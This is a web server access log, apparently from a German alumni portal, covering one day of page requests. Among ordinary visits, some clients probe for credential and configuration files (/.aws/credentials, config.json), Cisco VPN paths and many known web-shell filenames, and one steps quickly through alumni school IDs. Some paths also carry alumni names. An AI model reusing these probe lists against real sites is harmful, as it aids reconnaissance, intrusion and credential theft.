37a744b4a1b4bc4fdb9e5fc357bc8e592608e69447012033d07d1d523c95464f;2025-11-14 10:00:17;;/rechtliches/green-data;GET;200
b9453baa2e267caa68f2cc0559560781f709286b7f28b514cbd52e20a7206f5a;2025-11-14 10:03:42;;/htmx/get;GET;405
5f35d9a2a74ce8a26c5dc8728d87c87f4ea954e9ef164795416f27f9ab9de6bf;2025-11-14 10:07:37;;/reset-password/check-email;GET;200
c24be3db8f356cc3d1e3a4a859981337eaad08856f5370a289e977172a21ac53;2025-11-14 10:15:54;;/developmentserver/metadatauploader;GET;404
9ec0e23489a0b6037ae449e55a353efcb56c0241199ed555d96bee2680b843d3;2025-11-14 10:25:55;;/;GET;200
cb48c3006cdebd2f8345f2f06a979c835a798ebe24d428dd1f922dab54bacc21;2025-11-14 10:26:55;;/gruppen/hobby/logikspiele;GET;302
a155f2b582965bc1da550f0c7d0e3a9ab8e16879d057fef665d52e2cc464a18d;2025-11-14 10:26:57;;/gruppen;GET;200
cd0f45c1f56244a284e11fa4be0aae30e607a1c94c062015cd2b4c70a084ad42;2025-11-14 10:27:06;;/personen/alumni/details/heidi-burghard;GET;200
55ae4be24eceea0ca14399deac8ad6b3c3abf0c0246a06ea2716a4440e121063;2025-11-14 10:27:08;;/gruppen/hobby/yoga-und-meditation;GET;302
696221f6e6714fd22d9e7f596f56779a7463b33fc66edefbe4f9172ed7fad2d2;2025-11-14 10:27:10;;/gruppen;GET;200
a64fcf39ca65279017e02733c449c9da5eff0442f75628c1964fe7ec6a351b24;2025-11-14 10:27:13;;/gruppen/hobby/journalismus;GET;302
a0b8331d92c77071bb1cf051b16e93b069243729da123d44391407953e92219e;2025-11-14 10:27:15;;/gruppen;GET;200
2a5357350bcc430069bf0569cb3072b21def811fdbda48e261027cbfa1d3dce3;2025-11-14 10:27:43;;/gruppen/hobby/statistik;GET;302
b3cfeca9755d90196b33d0d5c477a1ebbb7bee6f1a590a4f578ebb2d6c2bd8b1;2025-11-14 10:27:43;;/gruppen/interesse/kundenbetreuung-und-beratung;GET;200
62cd05578436c3b4eecf15602885a1fc5f1ff9c6e3f54554fe75093393385b5b;2025-11-14 10:27:45;;/gruppen;GET;200
81d284e01cdc71cd5f1447fe802b413caa7e8d8abae6b8189342b84cf040d4bf;2025-11-14 10:27:45;;/personen/alumni/schule/190627;GET;200
0fc4942ec4e8fd5e0d99908e94244bbb9b83cf3edcff3e0024070fd48a8151d2;2025-11-14 10:27:48;;/gruppen/hobby/politik-und-debatten;GET;302
73debe2767ed878d596abe34c1341dbba892724cca115b6188b398f17da1cf6e;2025-11-14 10:27:50;;/gruppen;GET;200
63e4208b9cfb84b3a84c9ebb49de1bb8b4cc597e191592895312b69f5f153fef;2025-11-14 10:27:51;;/rechtliches/green-data;GET;200
107794adeca79992f0fb4aef0919450c93cf365db3954de502f8b2e58000b9d2;2025-11-14 10:27:55;;/personen/alumni/details/tobi-esche;GET;200
3b18b6ccac7947a2b74c7a8c72674cad02cbc35bab05ef973b6c48829150ca73;2025-11-14 10:28:02;;/gruppen/interesse/weiterbildung-und-training;GET;200
035ec889afbe9a247a51bf91d7910b22dae14a3501086858a6b9bf29a0056fdd;2025-11-14 10:28:04;;/gruppen/hobby/podcasting;GET;302
eac9587fbeb2749d44f0aff5ee1078ff8c03cebe75fc0e50eca91d0375b47ffa;2025-11-14 10:28:05;;/gruppen;GET;200
8409c57bdc87f339fbdb0d5d792ff111c505c3c9abd072912268b6f19a375197;2025-11-14 10:28:10;;/gruppen/hobby/literaturanalyse;GET;302
1b56f38cfb5d9979fcae5a400c9547f71f4d0f678e36a92913b830c8464b7806;2025-11-14 10:28:18;;/gruppen/hobby/philosophie;GET;302
8e9777f0ea8f6cfbea2001a460bde8f5204d197463d1a680a17b4b4999783ba7;2025-11-14 10:28:20;;/gruppen;GET;200
a346d500914549563238c5a32795f5778d8d3e54f999f758cf3ec360b0e663c4;2025-11-14 10:36:08;;/aktuelles/meldungen;GET;200
1bdd3e1bdde5421b4d0217044c4f69c3a0da873349ec0799d106a935bf01d5f1;2025-11-14 10:36:46;;/;GET;200
1bdd3e1bdde5421b4d0217044c4f69c3a0da873349ec0799d106a935bf01d5f1;2025-11-14 10:36:46;;/docker-compose.prod.yml;GET;404
2f31db41012a613aeeb9257eee4eeaa90ac19998f1a7c882b2dd115250af3ea3;2025-11-14 10:36:47;;/veranstaltungen;GET;200
1bdd3e1bdde5421b4d0217044c4f69c3a0da873349ec0799d106a935bf01d5f1;2025-11-14 10:36:48;;/config.json;GET;404
1bdd3e1bdde5421b4d0217044c4f69c3a0da873349ec0799d106a935bf01d5f1;2025-11-14 10:36:49;;/.aws/credentials;GET;404
4ccee17b2c36d2d2b620a77d289cca9fa784551bdccba9f9e54aa4054d5560cf;2025-11-14 10:38:37;;/about/allgemein;GET;200
12276bd578982ee19df0c645d090adffe8d026974f206b3050ff28ce41b8ea23;2025-11-14 10:44:19;;/;GET;200
85dea27dda4e3d079d77db059250125f554164d3626f1e551b0765e01a8a78fb;2025-11-14 10:45:11;;/gruppen/interesse/datenanalyse-und-forschung;GET;200
290191761fbf22c895dd9414a066fc80ff47751f0a3280001ae278ab18ef99aa;2025-11-14 10:48:07;;/;GET;200
14401751715173074351de0ed22b8115d6aac1134a711cf4b4ce090e13b19896;2025-11-14 10:48:52;;/+CSCOL+/Java.jar;GET;404
14401751715173074351de0ed22b8115d6aac1134a711cf4b4ce090e13b19896;2025-11-14 10:48:53;;/+CSCOE+/logon_forms.js;GET;404
14401751715173074351de0ed22b8115d6aac1134a711cf4b4ce090e13b19896;2025-11-14 10:48:54;;/+CSCOL+/a1.jar;GET;404
14401751715173074351de0ed22b8115d6aac1134a711cf4b4ce090e13b19896;2025-11-14 10:48:55;;/+CSCOE+/transfer.js;GET;404
1f21dfd519e71b08729b05bb74b66cae9ab079410ae5e1712fa9ed51471bbe65;2025-11-14 10:51:43;/;/;GET;200
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:33;;/aa.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:34;;/abcd.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:34;;/admin.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:35;;/buy.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:35;;/edit.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:36;;/file.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:36;;/flower.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:37;;/images/index.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:37;;/info.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:38;;/ioxi-o.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:38;;/nc4.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:38;;/xleet.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:39;;/wp-admin/includes/;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:39;;/wp-content/upgrade/index.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:39;;/wp-content/uploads/admin.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:40;;/wp-good.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:40;;/wp-includes/Text/Diff/Renderer/;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:41;;/wp-includes/style-engine/;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:41;;/xmrlpc.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:41;;/about.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:42;;/adminfuns.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:43;;/alfa.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:43;;/asasx.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:43;;/autoload_classmap.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:44;;/classwithtostring.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:44;;/cong.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:45;;/file2.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:45;;/moon.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:45;;/wp-admin/css/colors/blue/index.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:46;;/wp-content/index.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:46;;/wp-content/plugins/yanierin/akcc.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:47;;/wp-content/uploads/index.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:47;;/wp-content/wp-conflg.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:47;;/wp-cron.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:48;;/wp-includes/IXR/;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:48;;/wp-includes/block-supports/;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:49;;/wp-includes/fonts/;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:49;;/wp-includes/fonts/index.php;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:49;;/wp-includes/js/crop/;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:50;;/wp-includes/rest-api/;GET;404
9ab6be9927995efbbde3b33088d7e9bec5eb47ef699c1562ad96cde7b6f984dd;2025-11-14 10:56:50;;/wp-includes/widgets/;GET;404
d3612bd68536b5cc0e9cc8068e247917a8c17118e19711ff7066bc306bd4407e;2025-11-14 10:59:06;;/rechtliches/impressum;GET;200
380d7742379b851d607803b90372b36c4a74288c6f1a8fe09cef17bd8a35f567;2025-11-14 11:01:55;;/;GET;200
644d358b05251b32db4f41d93861827c1cc6a0dfc61d4cc19be37d69a3f5eaea;2025-11-14 11:03:57;;/;GET;200
b59dc1479c01cfab70d976e5c09b1e3144f9fb8ee45614bde92fa15a86ed6788;2025-11-14 11:08:55;;/;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-14 11:11:23;/gruppen/interesse/projektmanagement;/personen/alumni/details/benjamin-wagner;GET;200
b5c420c729b759ecd4e4be74b1772118db7dac7631b159bc37ea4a4cdaac3bd9;2025-11-14 11:14:20;;//installer.php;GET;404
163fc7d30b42abc08e91b21b7c03e5c98ec32013f24e4eddacf46a89b461d206;2025-11-14 11:16:44;;/;GET;200
4be85216f05427d3d925da3170f4c05f8052bb0905e568be7de5d82aae32c3b5;2025-11-14 11:19:30;;/gruppen;GET;200
a57942747c537f3932b7a0becc4d4315bf36755e10688510999660d73be87bcb;2025-11-14 11:22:40;;/login;GET;200
c0a7a966e7635d0e89fafec63569f0fc3b358c20c2d21fcfa9b4bca631d87c13;2025-11-14 11:33:23;;/gruppen/interesse/strategische-planung;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-14 11:38:12;/themen?category=community;/themen/details/was-kommt-nach-dem-abitur;GET;200
6240a1d075446a9bace05a3000772ef6d97686d240255bf6fc49384fe1c73ea4;2025-11-14 11:59:46;;/;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-14 12:01:41;/personen/alumni/details/sami-teuchert;/personen/alumni/schule/65262;GET;200
9cbddcc4d4c98041ddddc272a31fca1b27c1f7aceb39c809b856cbfa67a491db;2025-11-14 12:02:26;;/',;GET;404
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-14 12:03:10;/personen/alumni/details/sami-teuchert;/personen/alumni/schule/40745;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-14 12:04:27;/personen/alumni/details/benjamin-voigt;/personen/alumni/details/benjamin-voigt;GET;200
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:13;;/aa.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:15;;/abcd.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:15;;/admin.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:16;;/buy.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:18;;/edit.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:18;;/file.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:19;;/flower.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:20;;/images/index.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:21;;/info.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:22;;/ioxi-o.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:23;;/nc4.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:24;;/xleet.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:24;;/wp-admin/includes/;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:25;;/wp-content/upgrade/index.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:26;;/wp-content/uploads/admin.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:27;;/wp-good.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:28;;/wp-includes/Text/Diff/Renderer/;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:29;;/wp-includes/style-engine/;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:29;;/xmrlpc.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:30;;/about.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:31;;/adminfuns.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:32;;/alfa.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:33;;/asasx.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:34;;/autoload_classmap.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:35;;/classwithtostring.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:35;;/cong.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:36;;/file2.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:37;;/moon.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:38;;/wp-admin/css/colors/blue/index.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:39;;/wp-content/index.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:40;;/wp-content/plugins/yanierin/akcc.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:41;;/wp-content/uploads/index.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:42;;/wp-content/wp-conflg.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:42;;/wp-cron.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:43;;/wp-includes/IXR/;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:44;;/wp-includes/block-supports/;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:45;;/wp-includes/fonts/;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:46;;/wp-includes/fonts/index.php;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:47;;/wp-includes/js/crop/;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:48;;/wp-includes/rest-api/;GET;404
e2c0196a13f654e660f2d38211e5985dc4d31ad7034283a8a8dd4a7982756449;2025-11-14 12:07:48;;/wp-includes/widgets/;GET;404
f02287ca4438ec4b425ae3d433ce83dce35840893d0366fb825a0959ca56a865;2025-11-14 12:13:49;;//installer.php;GET;404
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-14 12:24:11;/personen/alumni/details/sami-teuchert;/personen/alumni/schule/01A04;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-14 12:25:35;/gruppen/hobby/nahen-und-textilarbeiten;/gruppen/hobby/fotobearbeitung;GET;302
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-14 12:25:36;/gruppen/hobby/nahen-und-textilarbeiten;/gruppen;GET;200
a3f7964d75549dc72a66a74fa0018647483eab378a9fa64985fbc88c68635ef3;2025-11-14 12:31:25;;/;GET;200
95f0311e9712947ea813105308d37216106abd33460ac9ec62ff6025f157f89c;2025-11-14 12:57:02;;/;GET;200
2b20843fabeb6745e6718f8f6519a2bb061657390c71a511955b3d5e8f5637be;2025-11-14 12:58:32;;/veranstaltungen;GET;200
ede14e5ea099b433da4e54e4c4db962ef8787f7df96cc6a9ef6aac6972a7e752;2025-11-14 13:00:13;/;/;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-14 13:01:07;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
0737f85a88bac5c3a540aabbe4d707fe9ba202a7ee8192cd5af24c621d5650af;2025-11-14 13:01:38;;/;GET;200
187b2aef031002914f5fdd141c4a76aa3dc24f5ea11446a89f65b008ccd2b13b;2025-11-14 13:12:04;;/;GET;200
30d9b6d477a977ea7d6ea5d6ae200b546876826c89593e2c9f4b14ed40100dda;2025-11-14 13:12:49;;/;GET;200
b1923c1410004eb3b7eb1346c9b29ec410512b606b96050de31af9c416ff1ba2;2025-11-14 13:13:14;/media/system/js/core.js;/media/system/js/core.js;GET;404
b1923c1410004eb3b7eb1346c9b29ec410512b606b96050de31af9c416ff1ba2;2025-11-14 13:13:15;/wp-includes/js/jquery/jquery.js;/wp-includes/js/jquery/jquery.js;GET;404
27615ed5d6c2293daa48bf2a4ff7f632f528bb80a2c2d9b794178164bdf49e7e;2025-11-14 13:28:07;;/;GET;200
ed179e1bac28674c703228cb82401e28cf5b1b1a6d7eccaf4311f3e0c4739641;2025-11-14 13:39:01;;/personen/alumni/schule/190627;GET;200
5e4f491803f84f4f531953aecad397f2ff1d2f375893a9437868b6406109c8dd;2025-11-14 13:47:22;;/themen;GET;200
66b46fd53e4c8264cc549c0b2e9004b3bafd90ac533b52758fbdbeb721faa080;2025-11-14 13:49:05;;/;GET;200
66b46fd53e4c8264cc549c0b2e9004b3bafd90ac533b52758fbdbeb721faa080;2025-11-14 13:49:06;;/;GET;200
1a65a19379ea25b8f2ae359ec72fb02478e4fb76662dfce5e9bb58609ee8e765;2025-11-14 14:12:43;;/;GET;200
d790aecabc2288c842d925d3a5e03ec091bd6b6afa67f7967475e8e522eb9682;2025-11-14 14:16:18;;/personen;GET;200
fffefe4546400d33fbdc98d0f62602bb390fef6872de65470d425eef8b6f7ea2;2025-11-14 14:16:34;;/veranstaltungen;GET;200
694879492b944681715d4e33ae0e69523d5c205094f56aae317ba551c0995dc0;2025-11-14 14:16:49;;/gruppen;GET;200
0862c1d6b1bee6f35e72e6c5be39e4b78fc580b6f369fd0bbc5f8d1c179b646a;2025-11-14 14:17:03;;/gruppen/interesse/kundenbetreuung-und-beratung;GET;200
48dca421053700e56604af7b24713009215d36acdf98f5d02c764389a7b5b49d;2025-11-14 14:17:04;;/aktuelles/meldungen;GET;200
679e1299625b093ec72bce9ea9e814334683a21da92e9497244eeb54dc949b99;2025-11-14 14:17:20;;/themen?category=kultur;GET;200
10965d9c751daf7fae9c76fe6661e1af8cf7007d2be6a10df7347dc31abc6864;2025-11-14 14:17:35;;/gruppen/hobby/wandern;GET;302
679e1299625b093ec72bce9ea9e814334683a21da92e9497244eeb54dc949b99;2025-11-14 14:17:50;;/gruppen/hobby/fitness;GET;302
c3ac250ea473b887ee82b49898c8bf30c044e346193bb801bf381cf8bebedfe0;2025-11-14 14:18:05;;/personen/alumni/schule/5511;GET;200
10965d9c751daf7fae9c76fe6661e1af8cf7007d2be6a10df7347dc31abc6864;2025-11-14 14:18:21;;/personen/alumni/schule/5501;GET;200
ebeb5e092a996248613e67c6c965da45cbe1026753de7ab4559bc70c593d76b5;2025-11-14 14:18:36;;/personen/alumni/schule/9002;GET;200
68e5700ed1d1a657f6d4e8a5969c142b60d506906dcbb5fd1345a210a248301d;2025-11-14 14:18:51;;/personen/alumni/schule/5820;GET;200
a3625d7476de565663cf2402c1f54eadf7e0a146b7aeef0fd7f65611e70c0726;2025-11-14 14:19:07;;/personen/alumni/schule/5505;GET;200
a3625d7476de565663cf2402c1f54eadf7e0a146b7aeef0fd7f65611e70c0726;2025-11-14 14:19:22;;/personen/alumni/schule/68470;GET;200
68e5700ed1d1a657f6d4e8a5969c142b60d506906dcbb5fd1345a210a248301d;2025-11-14 14:19:37;;/personen/alumni/schule/67945;GET;200
48dca421053700e56604af7b24713009215d36acdf98f5d02c764389a7b5b49d;2025-11-14 14:19:53;;/personen/alumni/schule/65286;GET;200
c3ac250ea473b887ee82b49898c8bf30c044e346193bb801bf381cf8bebedfe0;2025-11-14 14:20:08;;/personen/alumni/schule/68457;GET;200
679e1299625b093ec72bce9ea9e814334683a21da92e9497244eeb54dc949b99;2025-11-14 14:20:23;;/gruppen/hobby/philosophie;GET;302
a3625d7476de565663cf2402c1f54eadf7e0a146b7aeef0fd7f65611e70c0726;2025-11-14 14:20:38;;/gruppen/hobby/fotografie;GET;302
10965d9c751daf7fae9c76fe6661e1af8cf7007d2be6a10df7347dc31abc6864;2025-11-14 14:20:54;;/personen/alumni/schule/10A04;GET;200
48dca421053700e56604af7b24713009215d36acdf98f5d02c764389a7b5b49d;2025-11-14 14:21:09;;/personen/alumni/schule/09A05;GET;200
c3ac250ea473b887ee82b49898c8bf30c044e346193bb801bf381cf8bebedfe0;2025-11-14 14:21:24;;/personen/alumni/schule/04A06;GET;200
fffefe4546400d33fbdc98d0f62602bb390fef6872de65470d425eef8b6f7ea2;2025-11-14 14:21:40;;/personen/alumni/schule/4340014;GET;200
be5931cbddcadc4d03d4c047b5c61de457c479348d88b9208be9fe20a1abf728;2025-11-14 14:21:54;;/;GET;200
d790aecabc2288c842d925d3a5e03ec091bd6b6afa67f7967475e8e522eb9682;2025-11-14 14:21:55;;/personen/alumni/schule/BW001;GET;200
2a7e9588db109129a39198d6ea0fc2f6198386fc5e7d945e85579bb6991b6b60;2025-11-14 14:22:10;;/personen/alumni/schule/191073;GET;200
10965d9c751daf7fae9c76fe6661e1af8cf7007d2be6a10df7347dc31abc6864;2025-11-14 14:22:25;;/personen/alumni/schule/4240628;GET;200
679e1299625b093ec72bce9ea9e814334683a21da92e9497244eeb54dc949b99;2025-11-14 14:22:40;;/personen/alumni/schule/4240404;GET;200
2a7e9588db109129a39198d6ea0fc2f6198386fc5e7d945e85579bb6991b6b60;2025-11-14 14:22:56;;/personen/alumni/schule/4240016;GET;200
23475fe0363e13dbe5c18a0b5431b27a2d7c87b20d7259d8d58759260901ce68;2025-11-14 14:23:11;;/personen/alumni/schule/620014;GET;200
c3ac250ea473b887ee82b49898c8bf30c044e346193bb801bf381cf8bebedfe0;2025-11-14 14:23:26;;/personen/alumni/schule/164045;GET;200
c3ac250ea473b887ee82b49898c8bf30c044e346193bb801bf381cf8bebedfe0;2025-11-14 14:23:41;;/personen/alumni/schule/164094;GET;200
fffefe4546400d33fbdc98d0f62602bb390fef6872de65470d425eef8b6f7ea2;2025-11-14 14:23:56;;/personen/alumni/schule/170720;GET;200
a3625d7476de565663cf2402c1f54eadf7e0a146b7aeef0fd7f65611e70c0726;2025-11-14 14:24:12;;/gruppen/hobby/abschlussfest;GET;302
a8a8c31a677ae0cacc12312a66dea85436d8ee625bb769c1ad583e126f31514e;2025-11-14 14:24:27;;/themen/details/david-gegen-goliath;GET;200
a3625d7476de565663cf2402c1f54eadf7e0a146b7aeef0fd7f65611e70c0726;2025-11-14 14:24:42;;/personen/alumni/details/max-golze;GET;200
a3625d7476de565663cf2402c1f54eadf7e0a146b7aeef0fd7f65611e70c0726;2025-11-14 14:24:57;;/personen/alumni/schule/MP002;GET;200
c3ac250ea473b887ee82b49898c8bf30c044e346193bb801bf381cf8bebedfe0;2025-11-14 14:25:12;;/personen/alumni/schule/MP001;GET;200
c3ac250ea473b887ee82b49898c8bf30c044e346193bb801bf381cf8bebedfe0;2025-11-14 14:25:28;;/personen/alumni/schule/MP004;GET;200
5e4f491803f84f4f531953aecad397f2ff1d2f375893a9437868b6406109c8dd;2025-11-14 14:25:43;;/personen/alumni/schule/SL001;GET;200
d790aecabc2288c842d925d3a5e03ec091bd6b6afa67f7967475e8e522eb9682;2025-11-14 14:25:58;;/personen/alumni/schule/HS002;GET;200
c04144937db3fefaff9eb52f9350df1c4f8fbdc3b0312323d56c35c8601e4f55;2025-11-14 14:29:16;;/;GET;200
a459f70f5a7431f73cb7c3cb05ac74afbdf2db2b14cc48e02c3b0c693597155b;2025-11-14 14:33:06;;/;GET;200
1b60b90089f7e91b413e2d5090d939af718f326e1e2eba83d89d5a6455990e02;2025-11-14 14:35:06;;/personen/alumni/details/sidney-dittrich;GET;200
f0d928ccd0d84ef270b3baabdc4e6f8677e1025fa628e05f9edc0696ecd48594;2025-11-14 14:38:48;/;/;GET;200
